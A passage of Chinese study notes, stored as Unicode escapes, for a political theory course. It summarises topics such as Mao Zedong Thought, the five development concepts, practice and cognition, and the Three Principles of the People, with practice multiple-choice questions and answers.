C.\u4eba\u6c11\u65e5\u76ca\u589e\u957f\u7684\u7f8e\u597d\u751f\u6d3b\u7684\u9700\u8981 D.\u4e0d\u5e73\u8861\u4e0d\u5145\u5206\u7684\u53d1\u5c55 \u7b54\u6848 $$ A $$ \u6613\u9519\u9009\uff1aD \u3010\u5355\u9009\u3011\u6301\u7eed\u63a8\u8fdb\u201c\u4e09\u53bb\u4e00\u964d\u4e00\u8865\u201d\uff0c\u4f18\u5316\u5e02\u573a\u4f9b\u6c42\u7ed3\u6784\uff0c\u90a3\u4e48\u201c\u4e09\u53bb\u4e00\u964d\u4e00\u8865\u201d\u7684\u5185\u5bb9\u662f A.\u53bb\u77ed\u677f\u3001\u53bb\u7a0e\u8d39\u3001\u53bb\u6760\u6746\u3001\u964d\u5e93\u5b58\u3001\u8865\u4ea7\u80fd B.\u53bb\u4ea7\u80fd\u3001\u53bb\u7a0e\u8d39\u3001\u53bb\u6760\u6746\u3001\u964d\u5e93\u5b58\u3001\u8865\u77ed\u677f C.\u53bb\u4ea7\u80fd\u3001\u53bb\u5e93\u5b58\u3001\u53bb\u6760\u6746\u3001\u964d\u6210\u672c\u3001\u8865\u77ed\u677f D.\u53bb\u4ea7\u80fd\u3001\u53bb\u5e93\u5b58\u3001\u53bb\u77ed\u677f\u3001\u964d\u6210\u672c\u3001\u8865\u6760\u6746 \u7b54\u6848 $$ C $$ 2.2. \u5546\u54c1\u7684\u542b\u4e49 # \u2460 \u5b83\u662f\u4ee5\u4ea4\u6362\u4e3a\u76ee\u7684\u7684 \u2461 \u5b83\u5fc5\u987b\u662f\u52b3\u52a8\u4ea7\u54c1 2.3. \u6bdb\u6cfd\u4e1c\u601d\u60f3\u6d3b\u7684\u7075\u9b42 # \u2460 \u662f\uff08\u5b9e\u4e8b\u6c42\u662f\uff09 \u2461 \u7fa4\uff08\u7fa4\u4f17\u8def\u7ebf\uff09 \u2462 \u4e3b\uff08\u72ec\u7acb\u81ea\u4e3b\uff09 \u533a\u5206 \uff1a \u548c\u515a\u7684\u4e09\u5927\u6cd5\u5b9d\uff1a\u6218\u6597\u515a\uff08\u7edf\u4e00\u6218\u7ebf\uff0c\u6b66\u88c5\u6597\u4e89\uff0c\u515a\u7684\u5efa\u8bbe\uff09 \u515a\u4e09\u5927\u4f18\u826f\u4f5c\u98ce\uff1a\u5bc6\u5207\u8054\u7cfb\u7fa4\u4f17\uff0c\u7406\u8bba\u8054\u7cfb\u5b9e\u9645\uff0c\u6279\u8bc4\u4e0e\u81ea\u6211\u6279\u8bc4 \u3010\u591a\u9009\u3011\u4e2d\u5171\u4e2d\u592e\u300a\u5173\u4e8e\u5efa\u56fd\u4ee5\u6765\u515a\u7684\u82e5\u5e72\u5386\u53f2\u95ee\u9898\u7684\u51b3\u8bae\u300b\u6982\u62ec\u7684\u6bdb\u6cfd\u4e1c\u601d\u60f3\u6d3b\u7684\u7075\u9b42\u6709 A.\u515a\u7684\u5efa\u8bbe B.\u5b9e\u4e8b\u6c42\u662f C.\u7fa4\u4f17\u8def\u7ebf D.\u6b66\u88c5\u6597\u4e89 E.\u72ec\u7acb\u81ea\u4e3b \u7b54\u6848 $$ BCE $$ 2.4. \u79d1\u5b66\u9ad8\u5c1a\u7684\u4eba\u751f\u89c2 # \u2460 \u4eba\u751f\u76ee\u7684 \u2461 \u4eba\u751f\u6001\u5ea6 \u2462 \u4eba\u751f\u4ef7\u503c \u3010\u5355\u9009\u3011\u4eba\u751f\u89c2\u662f\u4eba\u4eec\u5728\u5b9e\u8df5\u4e2d\u5f62\u6210\u7684\u5bf9\u4eba\u751f\u7684\u76ee\u7684\u548c\u610f\u4e49\u7684\u6839\u672c\u770b\u6cd5\uff0c\u5b83\u51b3\u5b9a\u7740\u4eba\u4eec\u5b9e\u8df5\u6d3b\u52a8\u7684\u76ee\u6807\uff0c\u4eba\u751f\u9053\u8def\u7684\u65b9\u5411\u548c\u5bf9\u5f85\u751f\u6d3b\u7684\u6001\u5ea6\u662f\u4e16\u754c\u89c2\u7684\u91cd\u8981\u7ec4\u6210\u90e8\u5206\u3002\u4eba\u751f\u89c2\u7684\u6838\u5fc3\u662f A.\u4eba\u751f\u76ee\u7684 B.\u4eba\u751f\u6001\u5ea6 C.\u4eba\u751f\u4ef7\u503c D.\u4eba\u751f\u7ecf\u5386 \u7b54\u6848 $$ A $$ \u3010\u591a\u9009\u3011\u6bd4\u8f83\u5ba2\u89c2\u516c\u6b63\u51c6\u786e\u5730\u8bc4\u4ef7\u793e\u4f1a\u6210\u5458\u4eba\u751f\u4ef7\u503c\u7684\u5927\u5c0f\uff0c\u9664\u4e86\u8981\u638c\u63e1\u79d1\u5b66\u7684\u6807\u51c6\u5916\uff0c\u8fd8\u9700\u8981\u638c\u63e1\u6070\u5f53\u7684\u8bc4\u4ef7\u65b9\u6cd5\uff0c\u575a\u6301 A.\u80fd\u529b\u6709\u5927\u5c0f\u4e0e\u8d21\u732e\u987b\u5c3d\u529b\u76f8\u7edf\u4e00 B.\u7269\u8d28\u8d21\u732e\u4e0e\u7cbe\u795e\u8d21\u732e\u76f8\u7edf\u4e00 C.\u5b8c\u5584\u81ea\u8eab\u4e0e\u8d21\u732e\u793e\u4f1a\u76f8\u7edf\u4e00 D.\u5730\u4f4d\u4e0e\u5f71\u54cd\u76f8\u7edf\u4e00 \u7b54\u6848 $$ ABC $$ 2.5. \u5f62\u800c\u4e0a\u5b66 # \u53cd\u4e49\u8bcd\u662f\u8fa9\u8bc1\u6cd5\u3002 \u7279\u70b9\u662f\u5b64\u7acb\u7684\u3001\u9759\u6b62\u7684\u3001\u5426\u8ba4\u77db\u76fe\u7684\u3002 2.6. \u9a6c\u514b\u601d\u4e3b\u4e49\u4e2d\u56fd\u5316 # \u5c31\u662f\u5c06\u9a6c\u514b\u601d\u4e3b\u4e49\u548c\u4e2d\u56fd\u5b9e\u9645\u76f8\u7ed3\u5408\u3002 \u4e3a\u4ec0\u4e48\u8981\u5c06\u4ed6\u4eec\u76f8\u7ed3\u5408\uff1a \u2460 \u56e0\u4e3a\u9a6c\u514b\u601d\u9700\u8981 \u2461 \u56e0\u4e3a\u4e2d\u56fd\u9700\u8981 \u2462 \u6709\u7ed3\u5408\u7684\u57fa\u56e0 \u3010\u5355\u9009\u3011\u9a6c\u514b\u601d\u4e3b\u4e49\u4e2d\u56fd\u5316\u5386\u53f2\u8fc7\u7a0b\u4ea7\u751f\u4e86\u6bdb\u6cfd\u4e1c\u601d\u60f3\u548c\u4e2d\u56fd\u7279\u8272 \u793e\u4f1a\u4e3b\u4e49\u7406\u8bba\u4f53\u7cfb\u3002\u4e2d\u56fd\u7279\u8272\u793e\u4f1a\u4e3b\u4e49\u7406\u8bba\u4f53\u7cfb\u7684\u5f00\u521b\u4e4b\u4f5c\u662f A.\u6bdb\u6cfd\u4e1c\u601d\u60f3 B.\u9093\u5c0f\u5e73\u7406\u8bba C.\u4e09\u4e2a\u4ee3\u8868\u201c\u91cd\u8981\u601d\u60f3\u548c\u79d1\u5b66\u53d1\u5c55\u89c2 D.\u4e60\u8fd1\u5e73\u65b0\u65f6\u4ee3\u4e2d\u56fd\u7279\u8272\u793e\u4f1a\u4e3b\u4e49\u601d\u60f3 \u7b54\u6848 $$ B $$ \u3010\u591a\u9009\u3011\u4e2d\u56fd\u9769\u547d\u3001\u5efa\u8bbe\u548c\u6539\u9769\u7684\u5b9e\u8df5\u8bc1\u660e,\u8981\u8fd0\u7528\u9a6c\u514b\u601d\u4e3b\u4e49\u6307 \u5bfc\u5b9e\u8df5,\u5fc5\u987b\u5b9e\u73b0\u9a6c\u514b\u601d\u4e3b\u4e49\u4e2d\u56fd\u5316,\u9a6c\u514b\u601d\u4e3b\u4e49\u4e4b\u6240\u4ee5\u80fd\u591f\u4e2d\u56fd\u5316 \u7684\u539f\u56e0\u5728\u4e8e A.\u9a6c\u514b\u601d\u4e3b\u4e49\u7406\u8bba\u7684\u5185\u5728\u8981\u6c42 B.\u9a6c\u514b\u601d\u4e3b\u4e49\u4e0e\u4e2d\u534e\u6c11\u65cf\u4f18\u79c0\u6587\u5316\u5177\u6709\u76f8\u878d\u6027 C.\u4e2d\u56fd\u9769\u547d\u3001\u5efa\u8bbe\u548c\u6539\u9769\u7684\u5b9e\u8df5\u9700\u8981\u9a6c\u514b\u601d\u4e3b\u4e49\u6307\u5bfc D.\u9a6c\u514b\u601d\u4e3b\u4e49\u4e3a\u4e2d\u56fd\u9769\u547d\u3001\u5efa\u8bbe\u548c\u6539\u9769\u63d0\u4f9b\u4e86\u73b0\u5b9e\u7684\u53d1\u5c55\u6a21\u5f0f \u7b54\u6848 $$ ABC $$ 2.7. \u4e94\u5927\u53d1\u5c55\u7406\u5ff5 # \u521b\u65b0\u3001\u534f\u8c03\u3001\u7eff\u8272\u3001\u5f00\u653e\u3001\u5171\u4eab \u3010\u5355\u9009\u3011\u521b\u65b0\u3001\u534f\u8c03:\u7eff\u8272\u3001\u5f00\u653e\u3001\u5171\u4eab\u7684\u65b0\u53d1\u5c55\u7406\u5ff5,\u5404\u4e2a\u65b9\u9762\u7684\u4fa7\u91cd\u70b9\u90fd\u4e0d\u540c,\u5176\u4e2d \u5f00\u653e \u6ce8\u91cd\u7684\u662f A.\u89e3\u51b3\u793e\u4f1a\u7684\u516c\u5e73\u6b63\u4e49 B.\u89e3\u51b3\u53d1\u5c55\u7684\u4e0d\u5e73\u8861\u95ee\u9898 C.\u89e3\u51b3\u53d1\u5c55\u7684\u52a8\u529b\u95ee\u9898 D.\u89e3\u51b3\u53d1\u5c55\u5185\u5916\u8054\u52a8\u95ee\u9898 \u7b54\u6848 $$ D $$ \u3010\u5355\u9009\u3011\u521b\u65b0\u3001\u534f\u8c03\u3001\u7eff\u8272\u3001\u5f00\u653e\u3001\u5171\u4eab\u7684\u65b0\u53d1\u5c55\u7406\u5ff5,\u5404\u4e2a\u65b9\u9762\u7684\u4fa7\u91cd\u70b9\u90fd\u4e0d\u540c,\u5176\u4e2d \u534f\u8c03 \u6ce8\u91cd\u7684\u662f A.\u89e3\u51b3\u793e\u4f1a\u7684\u516c\u5e73\u6b63\u4e49 B.\u89e3\u51b3\u53d1\u5c55\u7684\u4e0d\u5e73\u8861\u95ee\u9898 C.\u89e3\u51b3\u53d1\u5c55\u7684\u52a8\u529b\u95ee\u9898 D.\u89e3\u51b3\u53d1\u5c55\u5185\u5916\u8054\u52a8\u95ee\u9898 \u7b54\u6848 $$ B $$ 3. \u7b2c\u4e09\u5468 # 3.1. \u4f9d\u6cd5\u6cbb\u56fd\u3001\u4ee5\u5fb7\u6cbb\u56fd # \u4f9d\u6cd5\u6cbb\u56fd\u662f\u6211\u4eec\u6cbb\u56fd\u7406\u653f\u7684\u57fa\u672c\u65b9\u5f0f\uff0c\u5177\u6709\u7edf\u4e00\u6027\uff0c\u4ee5\u56fd\u5bb6\u7684\u5f3a\u5236\u529b\u4e3a\u540e\u76fe\uff1b \u4ee5\u5fb7\u6cbb\u56fd\u662f\u6211\u4eec\u6cbb\u56fd\u7406\u653f\u7684\u91cd\u8981\u65b9\u5f0f\uff0c\u5bf9\u4e0d\u540c\u7684\u4eba\u5177\u6709\u4e0d\u4e00\u6837\u7684\u6807\u51c6\uff0c\u662f\u4ee5\u4eba\u4eec\u7684\u8206\u8bba\u548c\u6559\u5316\u4e3a\u540e\u76fe\u3002 3.2. \u552f\u7269\u4e3b\u4e49\u548c\u552f\u5fc3\u4e3b\u4e49 # \u54f2\u5b66\u7684\u57fa\u672c\u95ee\u9898\u5c31\u662f\u7814\u7a76\u7269\u8d28\u548c\u610f\u8bc6\u7684\u7b2c\u4e00\u6027\u548c\u540c\u4e00\u6027\u7684\u5173\u7cfb\u3002 3.3. \u8fd1\u4ee3\u4e2d\u56fd\u7684\u4e3b\u8981\u77db\u76fe\u548c\u4e3b\u8981\u4efb\u52a1 # \u4e3b\u8981\u77db\u76fe\uff1a\u5e1d\u56fd\u4e3b\u4e49\u548c\u4e2d\u534e\u6c11\u65cf\u7684\u77db\u76fe\uff1b\u5c01\u5efa\u4e3b\u4e49\u540c\u4eba\u6c11\u5927\u4f17\u7684\u77db\u76fe \u4e3b\u8981\u4efb\u52a1\uff1a\u6c11\u65cf\u72ec\u7acb\u3001\u4eba\u6c11\u89e3\u653e\uff1b\u56fd\u5bb6\u5bcc\u5f3a\u3001\u4eba\u6c11\u5bcc\u88d5 3.4. \u5b9e\u8df5\u548c\u8ba4\u8bc6\u7684\u5173\u7cfb # \u5b9e\u8df5\u662f\u8ba4\u8bc6\u7684\u57fa\u7840\uff1b \u5b9e\u8df5\u662f\u8ba4\u8bc6\u7684\u76ee\u7684\uff1b \u5b9e\u8df5\u662f\u8ba4\u8bc6\u53d1\u5c55\u7684\u52a8\u529b\uff1b 3.5. \u804c\u4e1a\u9053\u5fb7\u548c\u516c\u5171\u9053\u5fb7 # \u804c\u4e1a\u9053\u5fb7 \uff1a\u7231\u5c97\u656c\u4e1a\u3001\u8bda\u5b9e\u5b88\u4fe1\u3001\u529e\u4e8b\u516c\u9053\u3001\u670d\u52a1\u7fa4\u4f17\u3001\u5949\u732e\u793e\u4f1a \u516c\u5171\u9053\u5fb7 \uff1a\u6587\u660e\u793c\u8c8c\u3001\u52a9\u4eba\u4e3a\u4e50\u3001\u7231\u62a4\u516c\u7269\u3001\u4fdd\u62a4\u73af\u5883\u3001 \u9075\u7eaa\u5b88\u6cd5 \u9075\u7eaa\u5b88\u6cd5\uff1a\u6700\u57fa\u672c\u8981\u6c42 \u5949\u732e\u793e\u4f1a\uff1a\u6700\u9ad8\u8981\u6c42 3.6. \u4e2d\u56fd\u7cbe\u795e # \u2460 \u4ee5\u7231\u56fd\u4e3b\u4e49\u4e3a\u6838\u5fc3\u7684\u6c11\u65cf\u7cbe\u795e \u56db\u4e2a\u65b9\u9762\uff1a \u521b\u9020\u7cbe\u795e \u56e2\u7ed3\u7cbe\u795e \u594b\u6597\u7cbe\u795e \u68a6\u60f3\u7cbe\u795e \u2461 \u4ee5\u6539\u9769\u521b\u65b0\u4e3a\u6838\u5fc3\u7684\u65f6\u4ee3\u7cbe\u795e \u3010\u5355\u9009\u3011\u76d8\u53e4\u5f00\u5929\uff0c\u5973\u5a32\u8865\u5929\uff0c\u4f0f\u7fb2\u753b\u5366\uff0c\u795e\u519c\u5c1d\u8349\uff0c\u5938\u7236\u8ffd\u65e5\uff0c\u7cbe\u536b\u586b\u6d77\uff0c\u611a\u516c\u79fb\u5c71\u7b49\u6211\u56fd\u53e4\u4ee3\u795e\u8bdd\u6df1\u523b\u53cd\u6620\u4e86\u4e2d\u56fd\u4eba\u6c11\u5177\u6709\uff08 \uff09 A.\u4f1f\u5927\u7684\u594b\u6597\u7cbe\u795e B.\u4f1f\u5927\u7684\u521b\u9020\u7cbe\u795e C.\u4f1f\u5927\u7684\u56e2\u7ed3\u7cbe\u795e D.\u4f1f\u5927\u7684\u68a6\u60f3\u7cbe\u795e \u7b54\u6848 $$ D $$ 3.7. \u8f9b\u4ea5\u9769\u547d # \u4e09\u6c11\u4e3b\u4e49\uff1a\u6c11\u65cf\u3001\u6c11\u6743\u3001\u6c11\u751f\uff08\u4e2d\u56fd\u540c\u76df\u4f1a\u7eb2\u9886\uff09 \u4e09\u4e2a\u9769\u547d\uff1a \u6c11\u65cf\u4e3b\u4e49\u5bf9\u5e94\u6c11\u65cf\u9769\u547d\uff1b \u5185\u5bb9\uff1a\u9a71\u9010\u9791\u864f\uff0c\u6062\u590d\u4e2d\u534e \u5c40\u9650\uff1a\u9791\u864f\u6307\u6ee1\u6e05\u653f\u5e9c\uff0c\u6ca1\u6709\u53cd\u5bf9\u5e1d\u56fd\u4e3b\u4e49\uff0c\u53cd\u5c01\u5efa\u4e5f\u4e0d\u5f7b\u5e95 \u6c11\u6743\u4e3b\u4e49\u5bf9\u5e94\u653f\u6cbb\u9769\u547d\uff1b \u5185\u5bb9\uff1a\u521b\u7acb\u6c11\u56fd \u5c40\u9650\uff1a\u4ee3\u8868\u8d44\u4ea7\u9636\u7ea7\u5229\u76ca\uff0c\u6ca1\u6709\u4ee3\u8868\u6700\u5e7f\u5927\u7684\u4eba\u6c11\u5229\u76ca \u6c11\u751f\u4e3b\u4e49\u5bf9\u5e94\u793e\u4f1a\u9769\u547d\u3002 \u5185\u5bb9\uff1a\u5e73\u5747\u5730\u6743 \u5c40\u9650\uff1a\u6ca1\u6709\u771f\u6b63\u5730\u5206\u571f\u5730\uff0c\u65e0\u6cd5\u6210\u4e3a\u53d1\u52a8\u52b3\u52a8\u4eba\u6c11\u7684\u6b66\u5668 \u3010\u591a\u9009\u3011\u5728\u5b59\u4e2d\u5c71\u7684\u4e09\u6c11\u4e3b\u4e49\u4e2d\uff0c\u6c11\u751f\u4e3b\u4e49\u6307\u7684\u5c31\u662f\"\u5e73\u5747\u5730\u6743\"\uff0c\u4e5f\u5c31\u662f\u5b59\u4e2d\u5c71\u6240\u8bf4\u7684\u793e\u4f1a\u9769\u547d\uff0c\u5b59\u4e2d\u5c71\u7684\u6c11\u751f\u4e3b\u4e49\u7684\u5c40\u9650\u6027\u5728\u4e8e\uff08 \uff09 A.\"\u5e73\u5747\u5730\u6743\"\u7684\u4e3b\u5f20\u5e76\u975e\u5c06\u571f\u5730\u6240\u6709\u6743\u5206\u7ed9\u519c\u6c11 B.\u6ca1\u6709\u6b63\u9762\u89e6\u53ca\u5c01\u5efa\u571f\u5730\u6240\u6709\u5236 C.\u6ca1\u6709\u4ece\u6b63\u9762\u9c9c\u660e\u7684\u63d0\u51fa\u53cd\u5bf9\u5e1d\u56fd\u4e3b\u4e49\u7684\u7eb2\u9886 D.\u5728\u9769\u547d\u4e2d\u96be\u4ee5\u6210\u4e3a\u53d1\u52a8\u5e7f\u5927\u5de5\u519c\u7fa4\u4f17\u7684\u7406\u8bba\u6b66\u5668 \u7b54\u6848 $$ ABD $$ 3.8. \u793e\u4f1a\u5b58\u5728\u548c\u793e\u4f1a\u610f\u8bc6 # \u793e\u4f1a\u5b58\u5728\u51b3\u5b9a\u793e\u4f1a\u610f\u8bc6\uff0c\u793e\u4f1a\u610f\u8bc6\u5bf9\u793e\u4f1a\u5b58\u5728\u5177\u6709\u76f8\u5bf9\u72ec\u7acb\u6027\u3002 \u76f8\u5bf9\u72ec\u7acb\u6027\u8868\u73b0\u5728\u4e09\u4e2a\u65b9\u9762\uff1a \u2460 \u793e\u4f1a\u610f\u8bc6\u548c\u793e\u4f1a\u5b58\u5728\u5177\u6709\u53d1\u5c55\u7684\u4e0d\u5e73\u8861\u6027 \u2461 \u793e\u4f1a\u610f\u8bc6\u548c\u793e\u4f1a\u5b58\u5728\u5177\u6709\u793e\u4f1a\u5386\u53f2\u6027 \u2462 \u793e\u4f1a\u610f\u8bc6\u548c\u793e\u4f1a\u5b58\u5728\u5177\u6709\u80fd\u52a8\u53cd\u4f5c\u7528 \u793e\u4f1a\u5b58\u5728\u5305\u542b\u4e09\u4e2a\u65b9\u9762\u7684\u5185\u5bb9\uff1a \u7269\u8d28\u751f\u4ea7\u65b9\u5f0f\uff1b\u81ea\u7136\u5730\u7406\u73af\u5883\uff1b\u4eba\u53e3\u56e0\u7d20 \u3010\u5355\u9009\u3011\u793e\u4f1a\u5b58\u5728\u51b3\u5b9a\u793e\u4f1a\u610f\u8bc6,\u793e\u4f1a\u610f\u8bc6\u662f\u793e\u4f1a\u5b58\u5728\u7684\u53cd\u4f5c\u7528\u3002\u793e\u4f1a\u610f\u8bc6\u5177\u6709\u76f8\u5bf9\u72ec\u7acb\u6027,\u5373\u5b83\u5728\u53cd\u6620\u793e\u4f1a\u5b58\u5728\u7684\u540c\u65f6,\u8fd8\u6709\u81ea\u5df1\u7279\u6709\u7684\u53d1\u5c55\u5f62\u5f0f\u548c\u89c4\u5f8b\u3002\u793e\u4f1a\u610f\u8bc6\u76f8\u5bf9\u72ec\u7acb\u6027\u6700\u7a81\u51fa\u7684\u8868\u73b0\u662f A.\u793e\u4f1a\u610f\u8bc6\u4e0e\u793e\u4f1a\u5b58\u5728\u53d1\u5c55\u7684\u4e0d\u5b8c\u5168\u540c\u6b65\u6027 B.\u793e\u4f1a\u610f\u8bc6\u5185\u90e8\u5404\u79cd\u5f62\u5f0f\u4e4b\u95f4\u7684\u76f8\u4e92\u4f5c\u7528\u548c\u5f71\u54cd C.\u793e\u4f1a\u610f\u8bc6\u5404\u79cd\u5f62\u5f0f\u5404\u81ea\u6709\u5176\u5386\u53f2\u7ee7\u627f\u6027 D.\u793e\u4f1a\u610f\u8bc6\u5bf9\u793e\u4f1a\u5b58\u5728\u5177\u6709\u80fd\u52a8\u7684\u53cd\u4f5c\u7528 \u7b54\u6848 $$ D $$ 4. \u7b2c\u56db\u5468 # 4.1. \u65b0\u6c11\u4e3b\u4e3b\u4e49\u793e\u4f1a\u7684\u9636\u7ea7\u6784\u6210 # \u2460 \u5de5\u4eba\u9636\u7ea7 \u2461 \u519c\u6c11\u9636\u7ea7 \u2462 \u5c0f\u8d44\u4ea7\u9636\u7ea7 \u2463 \u6c11\u65cf\u8d44\u4ea7\u9636\u7ea7 \u3010\u5355\u9009\u3011 \u4e2d\u56fd\u6ca6\u4e3a\u534a\u6b96\u6c11\u5730\u534a\u5c01\u5efa\u793e\u4f1a\u8fc7\u7a0b\u4e2d\uff0c\u6700\u65e9\u51fa\u73b0\u7684\u4e00\u4e2a\u65b0\u7684\u793e\u4f1a\u9636\u7ea7\u662f A.\u519c\u6c11\u9636\u7ea7 B.\u5c0f\u8d44\u4ea7\u9636\u7ea7 C.\u8d44\u4ea7\u9636\u7ea7 D.\u65e0\u4ea7\u9636\u7ea7 \u7b54\u6848 $$ D $$ 4.2. \u4e24\u4e2a\u4e00\u767e\u5e74\u548c\u4e24\u6b65\u8d70 # \u4e24\u4e2a\u4e00\u767e\u5e74\uff1a \u7b2c\u4e00\u4e2a\u767e\u5e74\u662f\u5efa\u515a\uff081921\uff09\u4e00\u767e\u5468\u5e74\uff1b 2020\u5e74\u5168\u9762\u5efa\u6210\u5c0f\u5eb7\u793e\u4f1a\u3002 \u7b2c\u4e8c\u4e2a\u767e\u5e74\u662f\u4e2d\u534e\u4eba\u6c11\u5171\u548c\u56fd\u6210\u7acb\uff081949\uff09\u4e00\u767e\u5468\u5e74\u3002 2050\u5efa\u6210\u793e\u4f1a\u4e3b\u4e49\u73b0\u4ee3\u5316\u5f3a\u56fd\u3002 \u4e24\u6b65\u8d70\uff1a \u7b2c\u4e00\u6b65\uff1a\u4ece2020 \u5230 2035\uff0c\u57fa\u672c\u5b9e\u73b0\u793e\u4f1a\u4e3b\u4e49\u73b0\u4ee3\u5316\uff1b \u7b2c\u4e8c\u6b65\uff1a\u4ece2035 \u5230 2050\uff0c\u5efa\u6210\u73b0\u4ee3\u5316\u5f3a\u56fd\u3002 \u3010\u5355\u9009]\u7ecf\u8fc7\u957f\u671f\u52aa\u529b,\u4e2d\u56fd\u7279\u8272\u793e\u4f1a\u4e3b\u4e49\u8fdb\u5165\u4e86\u65b0\u65f6\u4ee3\u3002\u4e2d\u56fd\u7279\u8272\u793e\u4f1a\u4e3b\u4e49\u65b0\u65f6\u4ee3\u7684\u5fc5\u7136\u8981\u6c42\u548c\u5386\u53f2\u4efb\u52a1\u662f A.\u52302020\u5e74\u5168\u9762\u5efa\u6210\u5c0f\u5eb7\u793e\u4f1a B.\u52302035\u5e74\u57fa\u672c\u5b9e\u73b0\u793e\u4f1a\u4e3b\u4e49\u73b0\u4ee3\u5316 C.\u5230\u4e2d\u56fd\u5171\u4ea7\u515a\u8bde\u751f100\u5e74\u57fa\u672c\u5b9e\u73b0\u793e\u4f1a\u4e3b\u4e49\u73b0\u4ee3\u5316 D.\u5230\u65b0\u4e2d\u56fd\u8bde\u751f100\u5e74\u5efa\u6210\u793e\u4f1a\u4e3b\u4e49\u73b0\u4ee3\u5316\u5f3a\u56fd \u7b54\u6848 $$ D $$ 4.3. \u5b9e\u8df5\u7684\u6982\u5ff5\u548c\u57fa\u672c\u7ed3\u6784 # \u5b9e\u8df5\u7684\u6982\u5ff5\uff1a\u4eba\u7c7b\u80fd\u52a8\u6539\u9020\u4e16\u754c\u7684\u5ba2\u89c2\u7269\u8d28\u6027\u6d3b\u52a8\u3002 \u57fa\u672c\u7ed3\u6784\uff1a\u4e3b\u4f53\u3001\u4e2d\u4ecb\u3001\u5ba2\u4f53\u3002 4.4. \u5b9e\u8df5\u7684\u57fa\u672c\u7c7b\u578b # \u4e09\u4e2a\u57fa\u672c\u5b9e\u8df5\uff1a \u7269\u8d28\u751f\u4ea7\u5b9e\u8df5\uff1b \u793e\u4f1a\u653f\u6cbb\u5b9e\u8df5\uff1b \u79d1\u5b66\u6587\u5316\u5b9e\u9a8c \u65b0\u7684\u5b9e\u8df5\u5f62\u5f0f\uff1a \u865a\u62df\u5b9e\u8df5 \u3010\u591a\u9009\u3011\u8fa9\u8bc1\u552f\u7269\u4e3b\u4e49\u8ba4\u4e3a,\u5b9e\u8df5\u7684\u4e3b\u4f53\u548c\u5ba2\u4f53\u7684\u5173\u7cfb\u662f A.\u7b2c\u4e00\u6027\u548c\u7b2c\u4e8c\u6027\u7684\u5173\u7cfb B.\u6539\u9020\u548c\u88ab\u6539\u9020\u7684\u5173\u7cfb C.\u7406\u8bba\u6307\u5bfc\u5b9e\u8df5\u7684\u5173\u7cfb D.\u53cd\u6620\u548c\u88ab\u53cd\u6620\u7684\u5173\u7cfb \u7b54\u6848 $$ BD $$ 4.5. \u5b9e\u8df5\u7684\u57fa\u672c\u7279\u5f81 # \u76f4\u63a5\u73b0\u5b9e\u6027\uff1a\u76f4\u63a5\u4ed8\u51fa\u884c\u52a8\uff0c\u5b9e\u8df5\u52a8\u624b\u624d\u662f\u5b9e\u8df5 \u4e3b\u89c2\u80fd\u52a8\u6027\uff1a\u5b9e\u8df5\u9700\u8981\u610f\u8bc6\u7684\u6307\u5bfc \u793e\u4f1a\u5386\u53f2\u6027\uff1a\u4eca\u5929\u7684\u5b9e\u8df5\u662f\u5728\u6211\u4eec\u8fc7\u53bb\u7684\u57fa\u7840\u4e0a\u8fdb\u884c\u5b9e\u8df5 4.6. \u771f\u7406\u4e0e\u4ef7\u503c # \u771f\u7406\u662f\u4eba\u4eec\u5bf9\u5ba2\u89c2\u7269\u8d28\u4e16\u754c\u6b63\u786e\u7684\u8ba4\u8bc6\uff0c\u662f\u4e3b\u89c2\u548c\u5ba2\u89c2\u76f8\u7b26\u5408\u7684\u5185\u5bb9\uff1b \u4ef7\u503c\u662f\u5ba2\u89c2\u7269\u8d28\u5bf9\u4eba\u4eec\u9700\u8981\u7684\u6ee1\u8db3\u7a0b\u5ea6\u3002 \u3010\u591a\u9009\u3011\u57fa\u56e0\u7f16\u8f91\u662f\u5e94\u5bf9\u9057\u4f20\u6027\u75be\u75c5\u7684\u4e00\u79cd\u6f5c\u5728\u6cbb\u7597\u529e\u6cd5\uff0c\u4f46\u5176\u6280\u672f\u8fd0\u7528\u6781\u5177\u4e89\u8bae\uff0c\u8fd9\u4e0d\u4ec5\u662f\u56e0\u4e3a\u57fa\u56e0\u7684\u53d8\u5316\u4f1a\u4f20\u7ed9\u540e\u4ee3\u5e76\u6700\u7ec8\u6709\u53ef\u80fd\u5f71\u54cd\u6574\u4e2a\u57fa\u56e0\u5e93\uff0c\u800c\u4e14\u66f4\u91cd\u8981\u7684\u662f\u57fa\u56e0\u7f16\u8f91\u4f1a\u4ea7\u751f\u957f\u8fdc\u800c\u6df1\u523b\u7684\u793e\u4f1a\u5f71\u54cd\uff0c\u53ef\u80fd\u884d\u751f\u51fa\u4e00\u7cfb\u5217\u68d8\u624b\u7684\u4f26\u7406\u3001\u6cd5\u5f8b\u548c\u5b89\u5168\u96be\u9898\u3002\u6b63\u56e0\u5982\u6b64\uff0c\u8bb8\u591a\u56fd\u5bb6\u5bf9\u4eba\u7c7b\u57fa\u56e0\u7f16\u8f91\u6280\u672f\u5236\u5b9a\u4e86\u76f8\u5e94\u7684\u4f26\u7406\u3001\u6cd5\u5f8b\u89c4\u8303\u3002\u4eba\u7c7b\u4e25\u683c\u63a7\u5236\u57fa\u56e0\u7f16\u8f91\u884c\u4e3a\u7684\u539f\u56e0\u5728\u4e8e A.\u4eba\u7684\u5b9e\u8df5\u6d3b\u52a8\u8981\u9075\u5faa\u771f\u7406\u5c3a\u5ea6\u4e0e\u4ef7\u503c\u5c3a\u5ea6\u7684\u7edf\u4e00 B.\u57fa\u56e0\u7f16\u8f91\u6280\u672f\u53ef\u80fd\u7a81\u7834\u4eba\u7c7b\u7684\u4f26\u7406\u9053\u5fb7\u5e95\u7ebf C.\u79d1\u5b66\u6280\u672f\u6709\u65f6\u8868\u73b0\u4e3a\u5f02\u5df1\u7684\u3001\u654c\u5bf9\u7684\u529b\u91cf D.\u4eba\u7684\u5b9e\u8df5\u6d3b\u52a8\u662f\u5408\u89c4\u5f8b\u6027\u4e0e\u5408\u76ee\u7684\u6027\u7684\u7edf\u4e00 \u7b54\u6848 $$ ABCD $$ 4.7. \u5546\u54c1\u7ecf\u6d4e\u7684\u57fa\u672c\u77db\u76fe # \u662f\u79c1\u4eba\u52b3\u52a8\u548c\u793e\u4f1a\u52b3\u52a8\u4e4b\u95f4\u7684\u77db\u76fe\u3002 \u5546\u54c1\u7ecf\u6d4e\u4ee5\u4ea4\u6362\u4e3a\u76ee\u7684\uff0c\u6240\u4ee5\u5546\u54c1\u7ecf\u6d4e\u8981\u53d1\u5c55\u5c31\u8981\u8fdb\u884c\u4ea4\u6362\uff1b\u60f3\u8981\u628a \u79c1\u4eba\u52b3\u52a8 \u8f6c\u6362\u4e3a \u793e\u4f1a\u52b3\u52a8 